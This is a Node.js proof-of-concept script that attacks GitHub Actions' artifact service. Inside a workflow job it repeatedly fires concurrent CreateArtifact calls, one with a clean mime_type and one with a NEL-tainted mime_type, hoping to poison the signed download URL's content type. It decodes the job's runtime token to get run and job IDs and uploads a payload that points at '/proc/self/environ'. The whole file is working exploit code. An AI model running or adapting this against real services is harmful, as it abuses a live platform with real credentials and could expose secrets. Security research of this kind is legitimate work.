// TOCTOU race on artifact mime_type validation vs the signed rsct.
// Hypothesis: CreateArtifact validates mime_type, but if two creates share the
// same (run,name), the signed rsct that the download URL later reads can be
// poisoned with a NEL value that never passed validation.
import crypto from 'node:crypto';
import https from 'node:https';

const RESULTS = process.env.ACTIONS_RESULTS_URL;
const RT = process.env.ACTIONS_RUNTIME_TOKEN;
const GH = process.env.GH_TOKEN;
const REPO = process.env.GITHUB_REPOSITORY;
if (!RESULTS || !RT) { console.log('FATAL missing ACTIONS_* env'); process.exit(1); }

const claims = JSON.parse(Buffer.from(RT.split('.')[1], 'base64url').toString());
const scope = String(claims.scp || '').split(' ').find(s => s.startsWith('Actions.Results:'));
const [, runId, jobId] = scope.split(':');

const NEL = '\u0085';
const CLEAN = 'application/json';
const DIRTY = 'application/json' + NEL;          // JSON.stringify -> wire C2 85
const ROUNDS = Number(process.env.ROUNDS || 48);

const BODY = Buffer.from(JSON.stringify({
  full_name: REPO, owner: { login: 'z', avatar_url: 'file:///proc/self/environ' },
}), 'utf8');

function twirp(method, body) {
  return fetch(`${RESULTS.replace(/\/?$/, '/')}twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${RT}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  }).then(async r => ({ status: r.status, text: await r.text() }));
}
function put(url, data) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const req = https.request({ method: 'PUT', hostname: u.hostname, path: u.pathname + u.search,
      headers: { 'x-ms-blob-type': 'BlockBlob', 'x-ms-version': '2021-08-06', 'Content-Length': Buffer.byteLength(data) } },
      res => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
    req.on('error', reject); req.write(data); req.end();
  });
}
function restDownload(id) {
  return new Promise(resolve => {
    https.request({ method: 'GET', hostname: 'api.github.com',
      path: `/repos/${REPO}/actions/artifacts/${id}/zip`,
      headers: { Accept: 'application/vnd.github.v3+json', Authorization: `Bearer ${GH}`, 'User-Agent': 'race' } },
      res => {
        res.resume();
        const loc = res.headers.location;
        if (!loc) return resolve({ noloc: res.statusCode });
        const u = new URL(loc);
        const rsct = (u.search.match(/[?&]rsct=([^&]*)/) || [])[1] || '';
        https.get({ hostname: u.hostname, path: u.pathname + u.search, headers: { 'User-Agent': 'race' } }, r2 => {
          r2.resume();
          const ct = r2.headers['content-type'] || '';
          resolve({ rsct, ct, hex: Buffer.from(ct, 'latin1').toString('hex'), nel: Buffer.from(ct, 'latin1').includes(0x85) });
        }).on('error', e => resolve({ rsct, err: String(e) }));
      }).on('error', e => resolve({ err: String(e) })).end();
  });
}

const winners = [];
for (let i = 0; i < ROUNDS; i++) {
  const name = `race-${i}-${Date.now()}`;
  // fire clean + dirty create CONCURRENTLY on the same name
  const [c1, c2] = await Promise.all([
    twirp('CreateArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, version: 7, mime_type: CLEAN }),
    twirp('CreateArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, version: 7, mime_type: DIRTY }),
  ]);
  // whichever create returned a SAS, upload + finalize it
  let sas = null;
  for (const c of [c1, c2]) { if (c.status === 200) { try { sas = JSON.parse(c.text).signed_upload_url; } catch {} if (sas) break; } }
  if (!sas) { console.log(`r${i} c1=${c1.status} c2=${c2.status} NO-SAS`); continue; }
  await put(sas, BODY);
  const fin = await twirp('FinalizeArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name,
    size: BODY.length, hash: `sha256:${crypto.createHash('sha256').update(BODY).digest('hex')}` });
  if (fin.status !== 200) { console.log(`r${i} c1=${c1.status} c2=${c2.status} fin=${fin.status}`); continue; }
  const id = JSON.parse(fin.text).artifact_id;
  await new Promise(r => setTimeout(r, 1200));
  const d = await restDownload(id);
  console.log(`r${i} c1=${c1.status} c2=${c2.status} id=${id} rsct=${(d.rsct||'').slice(0,30)} hex=${(d.hex||'').slice(0,40)} NEL=${d.nel}`);
  if (d.nel) winners.push({ i, id, ...d });
}
console.log(`\n=== WINNERS ${winners.length} ===`);
for (const w of winners) console.log('WINNER ' + JSON.stringify(w));
console.log(winners.length ? '*** CARRIER FOUND ***' : 'none');
